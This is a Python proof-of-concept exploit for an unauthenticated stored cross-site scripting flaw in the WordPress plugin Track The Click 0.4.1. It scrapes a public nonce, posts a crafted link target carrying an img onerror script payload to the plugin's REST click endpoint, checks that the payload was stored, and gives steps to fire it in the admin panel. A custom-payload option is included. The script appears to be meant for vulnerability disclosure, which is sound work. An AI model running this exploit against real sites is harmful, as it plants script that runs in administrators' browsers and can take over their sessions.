#!/usr/bin/env python3
"""
PoC: Unauthenticated Stored XSS (by-domain).

Writer : unauthenticated visitor (only needs public wp_rest nonce).
Victim : admin viewing Track The Click > Clicks > Group by: domain.
Sink   : admin/js/track-the-click-admin.js updateDomainTable() uses jQuery .html()
         with unescaped `domain` derived from attacker-controlled L.url.

Usage:
    python3 poc.py --url=<url-post/page>
    python3 poc.py --url=https://victim.test/hello-world/ --anchor=poc

Requires: pip install requests
"""

import argparse
import random
import re
import sys
import urllib.parse

try:
    import requests
except ImportError:
    print("[-] Missing dependency: pip install requests", file=sys.stderr)
    sys.exit(1)


def extract_nonce(html: str) -> str | None:
    patterns = [
        r'var\s+ajax_var\s*=\s*\{[^}]*?"nonce"\s*:\s*"([^"]+)"',
        r'ajax_var[^}]*?"nonce"\s*:\s*"([^"]+)"',
        r'"nonce"\s*:\s*"([a-fA-F0-9]{10})"',
    ]
    for pat in patterns:
        m = re.search(pat, html, re.DOTALL)
        if m:
            return m.group(1).strip()
    return None


def extract_home_url(html: str, fallback_url: str) -> str:
    m = re.search(r'function\s+getHomeURL\(\)\s*\{\s*return\s*"([^"]+)"', html)
    if m:
        return m.group(1).rstrip("/")
    # Fallback: origin of --url (getHomeURL() is site home, usually same origin).
    u = urllib.parse.urlparse(fallback_url)
    return f"{u.scheme}://{u.netloc}".rstrip("/")


def extract_post_id(html: str) -> int:
    m = re.search(r'function\s+getPostID\(\)\s*\{\s*return\s*(\d+)', html)
    if m:
        try:
            return int(m.group(1))
        except ValueError:
            pass
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="Track The Click 0.4.1 Stored XSS PoC")
    ap.add_argument("--url", required=True, help="Full URL of a frontend post/page where tracking script is loaded")
    ap.add_argument("--anchor", default="poc", help="Anchor text to store (default: poc)")
    ap.add_argument("--payload", default=None, help="Custom target URL payload (default: auto-generated svg payload)")
    ap.add_argument("--timeout", type=int, default=15, help="HTTP timeout in seconds")
    args = ap.parse_args()

    page_url = args.url
    print(f"[*] GET {page_url}")
    try:
        r = requests.get(page_url, timeout=args.timeout, headers={"User-Agent": "Mozilla/5.0 PoC"})
    except Exception as e:
        print(f"[-] Cannot fetch --url: {e}", file=sys.stderr)
        return 1
    if r.status_code != 200:
        print(f"[-] GET --url returned HTTP {r.status_code}", file=sys.stderr)
        return 1

    html = r.text
    nonce = extract_nonce(html)
    if not nonce:
        print("[-] Cannot find ajax_var.nonce in page source. Is the plugin active with tracking enabled?", file=sys.stderr)
        print("    Hint: view-source and search for 'ajax_var' / 'wp_rest'.", file=sys.stderr)
        return 1
    print(f"[+] Found nonce: {nonce}")

    home = extract_home_url(html, page_url)
    post_id = extract_post_id(html)
    print(f"[+] Home: {home} | postID: {post_id} | location: {page_url}")

    rand = random.randint(100000, 999999)
    if args.payload:
        payload_target = args.payload
    else:
        # No '/' after the host part so MySQL REGEXP_REPLACE(L.url,'/.*','') keeps the tag intact.
        # Use <img onerror> (not <svg onload>): svg inserted via jQuery .html() inside <table>
        # often parses but never fires onload, while img with bad src reliably fires onerror.
        # Stored domain becomes: evil-<rand>.test"><img src=x onerror=alert(document.domain)>
        payload_target = f'https://evil-{rand}.test"><img src=x onerror=alert(document.domain)>'

    print(f"[+] Payload target: {payload_target}")

    cachebreak = random.randint(1, 999999)
    click_url = f"{home}/wp-json/track-the-click/v3/click/{cachebreak}"
    print(f"[*] POST {click_url}")

    data = {
        "postID": post_id,
        "location": page_url,
        "target": payload_target,
        "anchor": args.anchor,
        "_wpnonce": nonce,
    }
    headers = {
        "User-Agent": "Mozilla/5.0 PoC",
        "Referer": page_url,
        "X-WP-Nonce": nonce,
    }
    try:
        pr = requests.post(click_url, data=data, headers=headers, timeout=args.timeout)
    except Exception as e:
        print(f"[-] POST click failed: {e}", file=sys.stderr)
        return 1

    print(f"[+] Click response: HTTP {pr.status_code} body={pr.text.strip()[:200]!r}")
    if pr.status_code not in (200, 201) or "Tracked" not in pr.text:
        print("[-] Unexpected response (expected 'Tracked'). Nonce may be expired, re-run to grab a fresh one.", file=sys.stderr)
        return 1

    # Optional verification without admin access: this public endpoint echoes stored url/anchor raw.
    verify_marker = f"evil-{rand}" if not args.payload else payload_target[:40]
    try:
        vcb = random.randint(1, 999999)
        verify_url = f"{home}/wp-json/track-the-click/v3/getpagelinkclicks/{vcb}"
        vr = requests.post(
            verify_url,
            data={"postID": post_id, "location": page_url},
            headers={"User-Agent": "Mozilla/5.0 PoC", "X-WP-Nonce": nonce},
            timeout=args.timeout,
        )
        if verify_marker in vr.text:
            print(f"[+] Verified stored: marker {verify_marker!r} reflected in getpagelinkclicks response.")
        else:
            print(f"[!] Stored but marker not yet visible in getpagelinkclicks (may need matching postID/location). Continue to admin trigger.")
    except Exception as e:
        print(f"[!] Verify step skipped: {e}")

    print("")
    print("[+] Done. Now trigger XSS as admin:")
    print("    1. Login as admin.")
    print("    2. Open Track The Click > Clicks.")
    print("    3. Set 'Group by' to 'domain'.")
    print(f"    4. A row with domain containing {payload_target.split('://',1)[1][:60]!r} renders via .html() and fires onerror.")
    print("    NOTE: open DevTools Console first; if alert is blocked, use --payload with fetch/console.log variant.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
